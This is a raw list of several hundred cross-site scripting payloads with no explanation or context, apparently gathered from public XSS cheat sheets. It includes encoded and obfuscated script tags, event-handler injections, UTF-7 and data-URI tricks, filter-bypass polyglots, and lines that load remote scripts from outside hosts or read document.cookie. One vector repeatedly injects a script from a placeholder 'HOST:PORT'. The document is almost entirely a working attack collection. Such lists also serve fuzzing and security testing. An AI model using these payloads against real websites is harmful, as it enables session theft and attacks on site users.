<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>%3Cimg/src=%3Dx+onload=alert(2)%3D
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(0x0000EB)%3C/script%3E 
48e71%3balert(1)//503466e3
';confirm('XSS')//1491b2as
a29b1%3balert(888)//a62b7156d82
<scr&#x9ipt>alert('XSS')</scr&#x9ipt>
"onmouseover%3dprompt(941634) 
%f6%22%20onmouseover%3dprompt(941634)%20
" onerror=alert()1 a="
style=xss:expression(alert(1))
<input type=text value=“XSS”>
	A” autofocus onfocus=alert(“XSS”)//
<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>	
<a href="javascript:alert(1)">ssss</a>
+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
+ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-
+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-
<%00script>alert(‘XSS’)<%00/script>
<%script>alert(‘XSS’)<%/script>
<%tag style=”xss:expression(alert(‘XSS’))”>
<%tag    onmouseover="(alert('XSS'))"> is invalid. <%br />
</b style="expr/**/ession(alert('vulnerable'))">
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<SCRIPT SRC=//ha.ckers.org/.j>
<iframe src=http://ha.ckers.org/scriptlet.html <
<IMG SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<XSS STYLE="behavior: url(xss.htc);">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<IMG SRC='vbscript:msgbox("XSS")'>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);
<HTML xmlns:xss>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
  <xss:xss>XSS</xss:xss>
</HTML>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
alert`1`
alert&lpar;1&rpar;
alert&#x28;1&#x29
alert&#40;1&#41
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
navigator.vibrate(500)
eval(URL.slice(-8))>#alert(1)
eval(location.hash.slice(1)>#alert(1)
innerHTML=location.hash>#<script>alert(1)</script>
<svg onload=alert(1)>
"><svg onload=alert(1)//
"onmouseover=alert(1)//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
'-alert(1)//
\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!
<script>alert(1)//
<script>alert(1)<!–
<script src=//brutelogic.com.br/1.js>
<script src=//3334957647/1>
%3Cx onxxx=alert(1)
<%78 onxxx=1
<x %6Fnxxx=1
<x o%6Exxx=1
<x on%78xx=1
<x onxxx%3D1
<X onxxx=1
<x OnXxx=1
<X OnXxx=1
<x onxxx=1 onxxx=1
<x/onxxx=1
<x%09onxxx=1
<x%0Aonxxx=1
<x%0Conxxx=1
<x%0Donxxx=1
<x%2Fonxxx=1
<x 1='1'onxxx=1
<x 1="1"onxxx=1
<x </onxxx=1
<x 1=">" onxxx=1
<http://onxxx%3D1/
<x onxxx=alert(1) 1='
<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
<script>alert(1)</script>
<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
"><img src=1 onerror=alert(1)>.gif
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
<script src="data:&comma;alert(1)//
"><script src=data:&comma;alert(1)//
<script src="//brutelogic.com.br&sol;1.js&num;
"><script src=//brutelogic.com.br&sol;1.js&num;
<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
<base href=//0>
<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>
<script>window['alert'](document['domain'])<script>
